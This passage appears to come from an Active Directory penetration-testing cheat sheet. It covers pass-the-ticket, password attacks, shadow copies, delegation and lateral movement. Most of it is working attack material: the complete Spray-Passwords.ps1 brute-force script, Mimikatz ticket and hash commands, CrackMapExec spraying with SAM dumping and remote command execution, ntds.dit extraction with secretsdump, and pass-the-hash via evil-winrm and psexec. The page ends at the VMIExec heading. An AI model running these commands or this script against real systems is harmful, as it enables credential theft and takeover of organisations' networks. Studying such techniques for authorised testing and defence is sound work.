              <p><strong>Steps for Pass-the-Ticket Attack</strong>:</p>
              <ol>
                <li><strong>Dump the TGT ticket using Mimikatz</strong>:</li>
              </ol>
              <pre><code class="language-powershell">mimikatz # sekurlsa::tickets /export
</code></pre>
              <ol start="2">
                <li><strong>Pass the Kerberos TGT ticket</strong>:</li>
              </ol>
              <pre><code class="language-powershell">mimikatz # kerberos::ptt TGT_ticket.kirbi
</code></pre>
              <ol start="3">
                <li><strong>Access resources</strong>:</li>
              </ol>
              <pre><code class="language-bash">dir \\targetserver\sharedfolder
</code></pre>
              <h3 id="39-password-attacks">3.9 Password Attacks</h3>
              <h4 id="391-spraying-creds-with-script">3.9.1 Spraying Creds with Script</h4>
              <h5 id="3911-running-the-script">3.9.1.1 Running the Script</h5>
              <pre><code class="language-powershell"># -Pass allow us to use a single password to test.
# We could also add the option -File to use a personalized password wordlist.
# -Admin option is for adding test for admin account.
.\Spray-Passwords.ps1 -Pass [password] -Admin
</code></pre>
              <h5 id="3912-source-code-of-the-script">3.9.1.2 Source Code of the Script</h5>
              <pre><code class="language-powershell">&lt;#
  .SYNOPSIS
    PoC PowerShell script to demo how to perform password spraying attacks against
     user accounts in Active Directory (AD), aka low and slow online brute force method.
    Only use for good and after written approval from AD owner.
    Requires access to a Windows host on the internal network, which may perform
     queries against the Primary Domain Controller (PDC).
    Does not require admin access, neither in AD or on Windows host.
    Remote Server Administration Tools (RSAT) are not required.

    Should NOT be considered OPSEC safe since:
    - a lot of traffic is generated between the host and the Domain Controller(s).
    - failed logon events will be massive on Domain Controller(s).
    - badpwdcount will iterate on user account objects in scope.

    No accounts should be locked out by this script alone, but there are no guarantees.
    NB! This script does not take Fine-Grained Password Policies (FGPP) into consideration.
  .DESCRIPTION
    Perform password spraying attack against user accounts in Active Directory.
  .PARAMETER Pass
    Specify a single or multiple passwords to test for each targeted user account. Eg. -Pass &#39;Password1,Password2&#39;. Do not use together with File or Url.&quot;

  .PARAMETER File
    Supply a path to a password input file to test multiple passwords for each targeted user account. Do not use together with Pass or Url.

  .PARAMETER Url
    Download file from given URL and use as password input file to test multiple passwords for each targeted user account. Do not use together with File or Pass.

  .PARAMETER Admins
    Warning: will also target privileged user accounts (admincount=1.)&quot;. Default = $false.
  .EXAMPLE
    PS C:\&gt; .\Spray-Passwords.ps1 -Pass &#39;Summer2016&#39;
    1. Test the password &#39;Summer2016&#39; against all active user accounts, except privileged user accounts (admincount=1).
  .EXAMPLE
    PS C:\&gt; .\Spray-Passwords.ps1 -Pass &#39;Summer2016,Password123&#39; -Admins
    1. Test the password &#39;Summer2016&#39; against all active user accounts, including privileged user accounts (admincount=1).
  .EXAMPLE
    PS C:\&gt; .\Spray-Passwords.ps1 -File .\passwords.txt -Verbose

    1. Test each password in the file &#39;passwords.txt&#39; against all active user accounts, except privileged user accounts (admincount=1).
    2. Output script progress/status information to console.
  .EXAMPLE
    PS C:\&gt; .\Spray-Passwords.ps1 -Url &#39;https://raw.githubusercontent.com/ZilentJack/Get-bADpasswords/master/BadPasswords.txt&#39; -Verbose

    1. Download the password file with weak passwords.
    2. Test each password against all active user accounts, except privileged user accounts (admincount=1).
    3. Output script progress/status information to console.
  .LINK
    Get latest version here: https://github.com/ZilentJack/Spray-Passwords
  .NOTES
    Authored by    : Jakob H. Heidelberg / @JakobHeidelberg / www.improsec.com
    Together with  : CyberKeel / www.cyberkeel.com
    Date created   : 09/05-2016
    Last modified  : 26/06-2016
    Version history:
    - 1.00: Initial public release, 26/06-2016
    Tested on:
     - WS 2016 TP5
     - WS 2012 R2
     - Windows 10
    Known Issues &amp; possible solutions/workarounds:
     KI-0001: -
       Solution: -
    Change Requests for vNext (not prioritized):
     CR-0001: Support for Fine-Grained Password Policies (FGPP).
     CR-0002: Find better way of getting Default Domain Password Policy than &quot;NET ACCOUNTS&quot;. Get-ADDefaultDomainPasswordPolicy is not en option as it relies on RSAT.
     CR-0003: Threated approach to test more user/password combinations simultaneously.
     CR-0004: Exception or include list based on username, group membership, SID&#39;s or the like.
     CR-0005: Exclude user account that executes the script (password probably already known).
    Verbose output:
     Use -Verbose to output script progress/status information to console.
#&gt;

[CmdletBinding(DefaultParameterSetName=&#39;ByPass&#39;)]
Param
(
    [Parameter(Mandatory = $true, ParameterSetName = &#39;ByURL&#39;,HelpMessage=&quot;Download file from given URL and use as password input file to test multiple passwords for each targeted user account.&quot;)]
    [String]
    $Url = &#39;&#39;,

    [Parameter(Mandatory = $true, ParameterSetName = &#39;ByFile&#39;,HelpMessage=&quot;Supply a path to a password input file to test multiple passwords for each targeted user account.&quot;)]
    [String]
    $File = &#39;&#39;,

    [Parameter(Mandatory = $true, ParameterSetName = &#39;ByPass&#39;,HelpMessage=&quot;Specify a single or multiple passwords to test for each targeted user account. Eg. -Pass &#39;Password1,Password2&#39;&quot;)]
    [AllowEmptyString()]
    [String]
    $Pass = &#39;&#39;,

    [Parameter(Mandatory = $false,HelpMessage=&quot;Warning: will also target privileged user accounts (admincount=1.)&quot;)]
    [Switch]
    $Admins = $false

)

# Method to determine if input is numeric or not
Function isNumeric ($x) {
    $x2 = 0
    $isNum = [System.Int32]::TryParse($x, [ref]$x2)
    Return $isNum
}

# Method to get the lockout threshold - does not take FGPP into acocunt
Function Get-threshold
{
    $data = net accounts
    $threshold = $data[5].Split(&quot;:&quot;)[1].Trim()

    If (isNumeric($threshold) )
        {
            Write-Verbose &quot;threshold is a number = $threshold&quot;
            $threshold = [Int]$threshold
        }
    Else
        {
            Write-Verbose &quot;Threshold is probably &#39;Never&#39;, setting max to 1000...&quot;
            $threshold = [Int]1000
        }

    Return $threshold
}

# Method to get the lockout observation window - does not tage FGPP into account
Function Get-Duration
{
    $data = net accounts
    $duration = [Int]$data[7].Split(&quot;:&quot;)[1].Trim()
    Write-Verbose &quot;Lockout duration is = $duration&quot;
    Return $duration
}

# Method to retrieve the user objects from the PDC
Function Get-UserObjects
{
    # Get domain info for current domain
    Try {$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()}
    Catch {Write-Verbose &quot;No domain found, will quit...&quot; ; Exit}

    # Get the DC with the PDC emulator role
    $PDC = ($domainObj.PdcRoleOwner).Name

    # Build the search string from which the users should be found
    $SearchString = &quot;LDAP://&quot;
    $SearchString += $PDC + &quot;/&quot;
    $DistinguishedName = &quot;DC=$($domainObj.Name.Replace(&#39;.&#39;, &#39;,DC=&#39;))&quot;
    $SearchString += $DistinguishedName

    # Create a DirectorySearcher to poll the DC
    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
    $Searcher.SearchRoot = $objDomain

    # Select properties to load, to speed things up a bit
    $Searcher.PropertiesToLoad.Add(&quot;samaccountname&quot;) &gt; $Null
    $Searcher.PropertiesToLoad.Add(&quot;badpwdcount&quot;) &gt; $Null
    $Searcher.PropertiesToLoad.Add(&quot;badpasswordtime&quot;) &gt; $Null

    # Search only for enabled users that are not locked out - avoid admins unless $admins = $true
    If ($Admins) {$Searcher.filter=&quot;(&amp;(samAccountType=805306368)(!(lockoutTime&gt;=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))&quot;}
    Else {$Searcher.filter=&quot;(&amp;(samAccountType=805306368)(!(admincount=1))(!(lockoutTime&gt;=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))&quot;}
    $Searcher.PageSize = 1000

    # Find &amp; return targeted user accounts
    $userObjs = $Searcher.FindAll()
    Return $userObjs
}

# Method to perform auth test with specific username and password
Function Perform-Authenticate
{
    Param
    ([String]$username,[String]$password)

    # Get current domain with ADSI
    $CurrentDomain = &quot;LDAP://&quot;+([ADSI]&quot;&quot;).DistinguishedName

    # Try to authenticate
    Write-Verbose &quot;Trying to authenticate as user &#39;$username&#39; with password &#39;$password&#39;&quot;
    $dom = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $username, $password)
    $res = $dom.Name

    # Return true/false
    If ($res -eq $null) {Return $false}
    Else {Return $true}
}

# Validate and parse user supplied url to CSV file of passwords
Function Parse-Url
{
    Param ([String]$url)

    # Download password file from URL
    $data = (New-Object System.Net.WebClient).DownloadString($url)
    $data = $data.Split([environment]::NewLine)

    # Parse passwords file and return results
    If ($data -eq $null -or $data -eq &quot;&quot;) {Return $null}
    $passwords = $data.Split(&quot;,&quot;).Trim()
    Return $passwords
}

# Validate and parse user supplied CSV file of passwords
Function Parse-File
{
   Param ([String]$file)

   If (Test-Path $file)
   {
        $data = Get-Content $file

        If ($data -eq $null -or $data -eq &quot;&quot;) {Return $null}
        $passwords = $data.Split(&quot;,&quot;).Trim()
        Return $passwords
   }
   Else {Return $null}
}

# Main function to perform the actual brute force attack
Function BruteForce
{
   Param ([Int]$duration,[Int]$threshold,[String[]]$passwords)

   #Setup variables
   $userObj = Get-UserObjects
   Write-Verbose &quot;Found $(($userObj).count) active &amp; unlocked users...&quot;

   If ($passwords.Length -gt $threshold)
   {
        $time = ($passwords.Length - $threshold) * $duration
        Write-Host &quot;Total run time is expected to be around $([Math]::Floor($time / 60)) hours and $([Math]::Floor($time % 60)) minutes.&quot;
   }

   [Boolean[]]$done = @()
   [Boolean[]]$usersCracked = @()
   [Int[]]$numTry = @()
   $results = @()

   #Initialize arrays
   For ($i = 0; $i -lt $userObj.Length; $i += 1)
   {
        $done += $false
        $usersCracked += $false
        $numTry += 0
   }

   # Main while loop which does the actual brute force.
   Write-Host &quot;Performing brute force - press [q] to stop the process and print results...&quot; -BackgroundColor Yellow -ForegroundColor Black
   :Main While ($true)
   {
        # Get user accounts
        $userObj = Get-UserObjects

        # Iterate over every user in AD
        For ($i = 0; $i -lt $userObj.Length; $i += 1)
        {

            # Allow for manual stop of the while loop, while retaining the gathered results
            If ($Host.UI.RawUI.KeyAvailable -and (&quot;q&quot; -eq $Host.UI.RawUI.ReadKey(&quot;IncludeKeyUp,NoEcho&quot;).Character))
            {
                Write-Host &quot;Stopping bruteforce now....&quot; -Background DarkRed
                Break Main
            }

            If ($usersCracked[$i] -eq $false)
            {
                If ($done[$i] -eq $false)
                {
                    # Put object values into variables
                    $samaccountnname = $userObj[$i].Properties.samaccountname
                    $badpwdcount = $userObj[$i].Properties.badpwdcount[0]
                    $badpwdtime = $userObj[$i].Properties.badpasswordtime[0]

                    # Not yet reached lockout tries
                    If ($badpwdcount -lt ($threshold - 1))
                    {
                        # Try the auth with current password
                        $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]

                        If ($auth -eq $true)
                        {
                            Write-Host &quot;Guessed password for user: &#39;$samaccountnname&#39; = &#39;$($passwords[$numTry[$i]])&#39;&quot; -BackgroundColor DarkGreen
                            $results += $samaccountnname
                            $results += $passwords[$numTry[$i]]
                            $usersCracked[$i] = $true
                            $done[$i] = $true
                        }

                        # Auth try did not work, go to next password in list
                        Else
                        {
                            $numTry[$i] += 1
                            If ($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                        }
                    }

                    # One more tries would result in lockout, unless timer has expired, let&#39;s see...
                    Else
                    {
                        $now = Get-Date

                        If ($badpwdtime)
                        {
                            $then = [DateTime]::FromFileTime($badpwdtime)
                            $timediff = ($now - $then).TotalMinutes

                            If ($timediff -gt $duration)
                            {
                                # Since observation window time has passed, another auth try may be performed
                                $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]

                                If ($auth -eq $true)
                                {
                                    Write-Host &quot;Guessed password for user: &#39;$samaccountnname&#39; = &#39;$($passwords[$numTry[$i]])&#39;&quot; -BackgroundColor DarkGreen
                                    $results += $samaccountnname
                                    $results += $passwords[$numTry[$i]]
                                    $usersCracked[$i] = $true
                                    $done[$i] = $true
                                }
                                Else
                                {
                                    $numTry[$i] += 1
                                    If($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                                }

                            } # Time-diff if

                        }
                        Else
                        {
                            # Verbose-log if $badpwdtime in null. Possible &quot;Cannot index into a null array&quot; error.
                            Write-Verbose &quot;- no badpwdtime exception &#39;$samaccountnname&#39;:&#39;$badpwdcount&#39;:&#39;$badpwdtime&#39;&quot;



                                   # Try the auth with current password
                                $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]

                                If ($auth -eq $true)
                                {
                                    Write-Host &quot;Guessed password for user: &#39;$samaccountnname&#39; = &#39;$($passwords[$numTry[$i]])&#39;&quot; -BackgroundColor DarkGreen
                                    $results += $samaccountnname
                                    $results += $passwords[$numTry[$i]]
                                    $usersCracked[$i] = $true
                                    $done[$i] = $true
                                }
                                Else
                                {
                                    $numTry[$i] += 1
                                    If($numTry[$i] -eq $passwords.Length) {$done[$i] = $true}
                                }



                        } # Badpwdtime-check if

                    } # Badwpdcount-check if

                } # Done-check if

            } # User-cracked if

        } # User loop

        # Check if the bruteforce is done so the while loop can be terminated
        $amount = 0
        For ($j = 0; $j -lt $done.Length; $j += 1)
        {
            If ($done[$j] -eq $true) {$amount += 1}
        }

        If ($amount -eq $done.Length) {Break}

   # Take a nap for a second
   Start-Sleep -m 1000

   } # Main While loop

   If ($results.Length -gt 0)
   {
       Write-Host &quot;Users guessed are:&quot;
       For($i = 0; $i -lt $results.Length; $i += 2) {Write-Host &quot; &#39;$($results[$i])&#39; with password: &#39;$($results[$i + 1])&#39;&quot;}
   }
   Else {Write-Host &quot;No passwords were guessed.&quot;}
}

$passwords = $null

If ($Url -ne &#39;&#39;)
{
    $passwords = Parse-Url $Url
}
ElseIf($File -ne &#39;&#39;)
{
    $passwords = Parse-File $File
}
Else
{
    $passwords = $Pass.Split(&quot;,&quot;).Trim()
}

If($passwords -eq $null)
{
    Write-Host &quot;Error in password input, please try again.&quot;
    Exit
}

# Get password policy info
$duration = Get-Duration
$threshold = Get-threshold

If ($Admins) {Write-Host &quot;WARNING: also targeting admin accounts.&quot; -BackgroundColor DarkRed}

# Call the main function and start the brute force
BruteForce $duration $threshold $passwords
</code></pre>
              <h4 id="392-authenticating-using-directoryentry">3.9.2. Authenticating using DirectoryEntry</h4>
              <p>To authenticate against Active Directory using a specific username and password, you can utilize the
                <code>System.DirectoryServices</code> namespace in PowerShell. Below is an example of how to set this
                up:
              </p>
              <pre><code class="language-powershell"># Fetch the current domain object
$domainContext = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Identify the Primary Domain Controller (PDC) of the domain
$primaryDC = ($domainContext.PdcRoleOwner).Name

# Construct the LDAP path for directory access
$ldapPath = &quot;LDAP://&quot;
$ldapPath += $primaryDC + &quot;/&quot;

# Build the Distinguished Name (DN) for the domain structure
$domainDN = &quot;DC=$($domainContext.Name.Replace(&#39;.&#39;, &#39;,DC=&#39;))&quot;
$ldapPath += $domainDN

# Authenticate to the directory service with specific credentials
$directoryEntry = New-Object System.DirectoryServices.DirectoryEntry($ldapPath, &quot;[userName]&quot;, &quot;[password]&quot;)
</code></pre>
              <h4 id="393-using-crackmapexec">3.9.3 Using CrackMapExec</h4>
              <h5 id="3931-basic-commands">3.9.3.1 Basic Commands</h5>
              <ul>
                <li><strong>Basic Check for User Authentication</strong>:</li>
              </ul>
              <pre><code class="language-bash">crackmapexec smb [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com] --continue-on-success
or
crackmapexec smb [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com] --password-spray
or
crackmapexec smb [ip/domain] -u [userName] -p &#39;[password]&#39; -d [domain.com]
</code></pre>
              <ul>
                <li><strong>Using Kerberos for Authentication</strong>:</li>
              </ul>
              <pre><code class="language-bash">crackmapexec smb [ip/domain] -u [userName] -p &#39;[password]&#39; -d [domain.com] --kerberos
</code></pre>
              <ul>
                <li><strong>Domain and SMB Signing Check</strong>: checks for SMB signing requirements along with user
                  authentication.</li>
              </ul>
              <pre><code class="language-bash">crackmapexec smb [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com] --signing
</code></pre>
              <ul>
                <li><strong>Continue on Error</strong>: using the <code>--continue-on-error</code> flag will allow the
                  command to run even if some accounts fail.</li>
              </ul>
              <pre><code class="language-bash">crackmapexec smb [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com] --continue-on-error
</code></pre>
              <h5 id="3932-additional-commands">3.9.3.2 Additional Commands</h5>
              <ul>
                <li><strong>Attempting to Enumerate Shares on the Target</strong>: you can enumerate shared folders on
                  the target machine while testing user credentials.</li>
              </ul>
              <pre><code class="language-bash">crackmapexec smb [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com] --shares
</code></pre>
              <ul>
                <li><strong>Testing for SMBv1</strong>: to check if the target supports SMBv1.</li>
              </ul>
              <pre><code class="language-bash">crackmapexec smb [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com] --smbv1
</code></pre>
              <ul>
                <li><strong>Getting Session Information</strong>: you can obtain active sessions on the target machine.
                </li>
              </ul>
              <pre><code class="language-bash">crackmapexec smb [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com] --sessions
</code></pre>
              <ul>
                <li><strong>Dumping SAM Hashes</strong>: if you have admin rights, you can attempt to dump the SAM
                  database:</li>
              </ul>
              <pre><code class="language-bash">crackmapexec smb [ip/domain] -u Administrator -p &#39;[AdminPassword]!&#39; -d [domain.com] --sam
</code></pre>
              <ul>
                <li><strong>Running Commands Remotely</strong>:</li>
              </ul>
              <pre><code class="language-bash">crackmapexec smb [ip/domain] -u [userName] -p &#39;[password]!&#39; -d [domain.com] --exec-command &quot;[command]&quot;
</code></pre>
              <h5 id="3933-possible-services-to-test">3.9.3.3 Possible Services to Test</h5>
              <ol>
                <li><strong>SMB (Server Message Block)</strong> - Port 445</li>
              </ol>
              <pre><code class="language-bash">crackmapexec smb [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com]
</code></pre>
              <ol start="2">
                <li><strong>RDP (Remote Desktop Protocol)</strong> - Port 3389</li>
              </ol>
              <pre><code class="language-bash">crackmapexec rdp [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com]
</code></pre>
              <ol start="3">
                <li><strong>WinRM (Windows Remote Management)</strong> - Port 5985/5986</li>
              </ol>
              <pre><code class="language-bash">crackmapexec winrm [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com]
</code></pre>
              <ol start="4">
                <li><strong>HTTP/HTTPS (Web Services)</strong> - Ports 80/443</li>
              </ol>
              <pre><code class="language-bash">crackmapexec http [ip/domain] -u [userName] -p &#39;[password]&#39;
</code></pre>
              <ol start="5">
                <li><strong>FTP (File Transfer Protocol)</strong> - Port 21</li>
              </ol>
              <pre><code class="language-bash">crackmapexec ftp [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com]
</code></pre>
              <ol start="6">
                <li><strong>Telnet</strong> - Port 23</li>
              </ol>
              <pre><code class="language-bash">crackmapexec telnet [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com]
</code></pre>
              <ol start="7">
                <li><strong>SMTP (Simple Mail Transfer Protocol)</strong> - Port 25</li>
              </ol>
              <pre><code class="language-bash">crackmapexec smtp [ip/domain] -u [users_file].txt -p &#39;[password]&#39;
</code></pre>
              <ol start="8">
                <li><strong>DNS (Domain Name System)</strong> - Port 53</li>
              </ol>
              <pre><code class="language-bash">crackmapexec dns [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com]
</code></pre>
              <ol start="9">
                <li><strong>LDAP (Lightweight Directory Access Protocol)</strong> - Ports 389/636</li>
              </ol>
              <pre><code class="language-bash">crackmapexec ldap [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com]
</code></pre>
              <ol start="10">
                <li><strong>NetBIOS</strong> - Ports 137-139</li>
              </ol>
              <pre><code class="language-bash">crackmapexec netbios [ip/domain] -u [users_file].txt -p &#39;[password]&#39; -d [domain.com]
</code></pre>
              <ol start="11">
                <li><strong>MySQL</strong> - Port 3306</li>
              </ol>
              <pre><code class="language-bash">crackmapexec mysql [ip/domain] -u [users_file].txt -p &#39;[password]&#39;
</code></pre>
              <ol start="12">
                <li><strong>PostgreSQL</strong> - Port 5432</li>
              </ol>
              <pre><code class="language-bash">crackmapexec postgres [ip/domain] -u [users_file].txt -p &#39;[password]&#39;
</code></pre>
              <ol start="13">
                <li><strong>MS SQL Server</strong> - Port 1433</li>
              </ol>
              <pre><code class="language-bash">crackmapexec mssql [ip/domain] -u [users_file].txt -p &#39;[password]&#39;
</code></pre>
              <ol start="14">
                <li><strong>Oracle Database</strong> - Port 1521</li>
              </ol>
              <pre><code class="language-bash">crackmapexec oracle [ip/domain] -u [users_file].txt -p &#39;[password]&#39;
</code></pre>
              <ol start="15">
                <li><strong>Redis</strong> - Port 6379</li>
              </ol>
              <pre><code class="language-bash">crackmapexec redis [ip/domain] -u [users_file].txt -p &#39;[password]&#39;
</code></pre>
              <ol start="16">
                <li><strong>Docker Remote API</strong> - Port 2375</li>
              </ol>
              <pre><code class="language-bash">crackmapexec docker [ip/domain] -u [users_file].txt -p &#39;[password]&#39;
</code></pre>
              <ol start="17">
                <li><strong>SNMP (Simple Network Management Protocol)</strong> - Port 161</li>
              </ol>
              <pre><code class="language-bash">crackmapexec snmp [ip/domain] -u [users_file].txt -p &#39;[password]&#39;
</code></pre>
              <ol start="18">
                <li><strong>NTP (Network Time Protocol)</strong> - Port 123</li>
              </ol>
              <pre><code class="language-bash">crackmapexec ntp [ip/domain]
</code></pre>
              <h4 id="394-using-kerbrute">3.9.4 Using kerbrute</h4>
              <pre><code class="language-powershell"># The executable can be found in the kerbrute GitHub (link in Section 18.3.2.2).
.\kerbrute_windows_amd64.exe passwordspray -d [domain.com] .\[usernames_file].txt &quot;[password]&quot;
</code></pre>
              <h3 id="310-shadow-copies">3.10 Shadow Copies</h3>
              <p>Shadow Copies, also known as Volume Shadow Copy Service (VSS), is a Windows feature that creates backup
                copies or snapshots of computer files or volumes, even when they are in use. Attackers can exploit
                Shadow Copies to retrieve sensitive information, including previous versions of files and credentials.
              </p>
              <p><strong>How It Works</strong>:</p>
              <ol>
                <li><strong>Creation of Shadow Copies</strong>: Shadow Copies are created automatically or can be
                  manually initiated. They allow for data recovery and backup without disrupting active processes.</li>
                <li><strong>Accessing Shadow Copies</strong>: The shadow copies can be accessed through the file system,
                  often found in a hidden directory. This feature can be used to recover deleted files or view past
                  versions of files.</li>
              </ol>
              <p><strong>Steps to Attack Shadow Copies</strong>:</p>
              <ol>
                <li><strong>Create a Shadow Copy of the Entire Disk</strong>: <em>this action requires local
                    administrator privileges.</em></li>
              </ol>
              <pre><code class="language-powershell"># -p X: this indicates which disk we wanto to copy, usually is C.
vshadow.exe -nw -p C:
</code></pre>
              <ol start="2">
                <li><strong>Copy the NTDS Database to the Specified Destination Copying the NTDS Database to the
                    <code>C:</code> Drive</strong>: to back up the NTDS database from the shadow copy, use the following
                  command.</li>
              </ol>
              <pre><code class="language-powershell"># Replace X with the shadow copy number, found in the previous command
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\ntds\ntds.dit C:\desired\backup\path\ntds.dit.bak

# Example
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
</code></pre>
              <ol start="3">
                <li><strong>Save the System Registry to the Specified Destination</strong>:</li>
              </ol>
              <pre><code class="language-powershell">reg.exe save hklm\system C:\backup_path\system.bak

# Example
C:\&gt; reg.exe save hklm\system c:\system.bak
</code></pre>
              <ol start="4">
                <li>
                  <p><strong>Download the Files to the Kali</strong>: use strategies from Section 17.</p>
                </li>
                <li>
                  <p><strong>Extract the Data from the NTDS Database using Kali</strong>: this command retrieves user
                    credentials and hash values from the NTDS database backup, enabling further security assessments.
                  </p>
                </li>
              </ol>
              <pre><code class="language-bash">impacket-secretsdump -ntds [ntds_file] -system [system_file] LOCAL

# Example
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL</code></pre>
              <ol start="6">
                <li><strong>(Optional): use Mimikatz</strong> to extract the credentials if it is not possible to bring
                  the files to the Kali.</li>
              </ol>
              <pre><code class="language-powershell">mimikatz # lsadump::ntds /ntds:&quot;[ntds_file]&quot; /system:&quot;[system_file]&quot;</code></pre>
              <p><strong>Steps to Access Shadow Copies</strong>:</p>
              <ol>
                <li><strong>List Shadow Copies</strong>: use the following command to view existing shadow copies on a
                  system.</li>
              </ol>
              <pre><code class="language-powershell">vssadmin list shadows
</code></pre>
              <ol start="2">
                <li><strong>Access a Shadow Copy</strong>:<ul>
                    <li>Find the shadow copy you want to access and note its shadow copy ID.</li>
                    <li>Mount the shadow copy using the following command:</li>
                  </ul>
                </li>
              </ol>
              <pre><code class="language-powershell"># Replace X with the shadow copy number.
mklink /d C:\ShadowCopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX
</code></pre>
              <ol start="3">
                <li><strong>Explore the Mounted Shadow Copy</strong>: navigate to the new folder
                  (<code>C:\ShadowCopy</code>) to explore and extract files.</li>
              </ol>
              <pre><code class="language-powershell">dir C:\ShadowCopy
</code></pre>
              <ol start="4">
                <li><strong>Recover Sensitive Data</strong>: look for sensitive files, such as password files,
                  documents, or configuration files that may contain credentials or sensitive information.</li>
              </ol>
              <h3 id="311-constrained-delegation-attack">3.11 Constrained Delegation Attack</h3>
              <p>Constrained Delegation allows specific accounts to impersonate other users and access resources on
                their behalf, but only for certain services. Attackers can exploit misconfigured constrained delegation
                to escalate privileges or access sensitive data.</p>
              <p><strong>How It Works</strong>:</p>
              <ol>
                <li><strong>Understanding Delegation</strong>: When a service account is set up with constrained
                  delegation, it can request service tickets to access other resources using the identity of the user
                  who authenticated to it.</li>
                <li><strong>Exploitation</strong>: If an attacker can obtain the service account&rsquo;s credentials or
                  exploit a misconfiguration, they can impersonate users and access services that the account is
                  permitted to use.</li>
              </ol>
              <p><strong>Steps to Exploit a Constrained Delegation Attack</strong>:</p>
              <ol>
                <li><strong>Identify Delegated Accounts</strong>: use the following command to identify accounts with
                  delegated permissions.</li>
              </ol>
              <pre><code class="language-powershell">Get-ADComputer -Filter {ServicePrincipalName -like &quot;*&quot;} -Property ServicePrincipalName | Select-Object Name,ServicePrincipalName
</code></pre>
              <ol start="2">
                <li><strong>Check Constrained Delegation Settings</strong>: use the PowerShell command to check for
                  delegated permissions.</li>
              </ol>
              <pre><code class="language-powershell">Get-ADUser -Identity &lt;ServiceAccount&gt; -Properties msDS-AllowedToDelegateTo
</code></pre>
              <ol start="3">
                <li><strong>Perform Kerberos Ticket Granting</strong>: if you have the service account credentials, use
                  them to request service tickets.</li>
              </ol>
              <pre><code class="language-bash">kinit &lt;ServiceAccount&gt;
</code></pre>
              <ol start="4">
                <li><strong>Access Resources as a Delegated User</strong>: once you have the ticket, access the
                  resources using the identity of the impersonated user.</li>
              </ol>

              <h2 id="4-active-directory-lateral-movement">4. <span class="emoji">↔️</span> Active Directory Lateral
                Movement</h2>
              <h3 id="41-techniques-and-preparation">4.1 Techniques and Preparation</h3>
              <ul>
                <li><strong>PowerShell Execution Policy Bypass</strong>:</li>
              </ul>
              <pre><code class="language-powershell">powershell -ExecutionPolicy Bypass -File [script].ps1
</code></pre>
              <ul>
                <li>
                  <p><strong>Having valid credentials</strong>: in this case we can use any tools from either Windows or
                    Kali to connect to the system from an internal server, keep in mind the other possibilities of
                    impersonations using <strong>Silver and Golden Tickets</strong>, they are very important and are in
                    the Section 3, as well as <strong>password spraying</strong> with <code>crackmapexec</code> from
                    the
                    Section 6.2 and accessing the <strong>Shadow Copies</strong> (Section 3.10).</p>
                </li>
                <li>
                  <p><strong>Pass-the-Ticket</strong>: we use a Kerberos ticket to impersonate users, this is done using
                    Silver or Golden Tickets, for that check the Sections 3.3(Silver Ticket) and 3.4 (Golden Ticket).
                  </p>
                </li>
                <li>
                  <p><strong>Overpass-the-Hash</strong>: uses an NTLM hash to request a Kerberos ticket (TGT), allowing
                    attacks like pass-the-ticket.</p>
                </li>
              </ul>
              <pre><code class="language-powershell">mimikatz # sekurlsa::pth /user:&lt;username&gt; /domain:&lt;domain&gt; /ntlm:&lt;NTLM_hash&gt; /run:powershell

# You can then execute commands in the PowerShell session as if you were logged in as the other user, for example here we are moving to another system as the other user and running a shell:
.\PsExec.exe \\&lt;target_system&gt; cmd
</code></pre>
              <h3 id="42-from-kali">4.2 From Kali</h3>
              <h4 id="421-evil-winrm">4.2.1 Evil-WinRM</h4>
              <ul>
                <li><strong>Password</strong>:</li>
              </ul>
              <pre><code class="language-bash">evil-winrm -u &lt;username&gt; -p &lt;password&gt; -i &lt;target_ip&gt;
</code></pre>
              <ul>
                <li><strong>NTLM Hash</strong>:</li>
              </ul>
              <pre><code class="language-bash"># Use -S option to ignore SSL validation for insecure systems.
evil-winrm -i &lt;target_ip&gt; -u &lt;username&gt; -H &lt;LM_hash&gt;:&lt;NTLM_hash&gt;
# or
evil-winrm -i &lt;target_ip&gt; -u &lt;username&gt; -H 00000000000000000000000000000000:&lt;NTLM_hash&gt;
</code></pre>
              <h4 id="422-psexec">4.2.2 PsExec</h4>
              <ul>
                <li><strong>Password</strong>:</li>
              </ul>
              <pre><code class="language-bash">impacket-psexec &lt;username&gt;:&lt;password&gt;@&lt;target_ip&gt;
</code></pre>
              <ul>
                <li><strong>NTLM Hash</strong>:</li>
              </ul>
              <pre><code class="language-bash">impacket-psexec &lt;username&gt;@&lt;target_ip&gt; -hashes &lt;LM_hash&gt;:&lt;NTLM_hash&gt;
# or
impacket-psexec &lt;username&gt;@&lt;target_ip&gt; -hashes 00000000000000000000000000000000:&lt;NTLM_hash&gt;
</code></pre>
              <h4 id="423-vmiexec">4.2.3 VMIExec</h4>
              <ul>
                <li><strong>Password</strong>:</li>
              </ul>
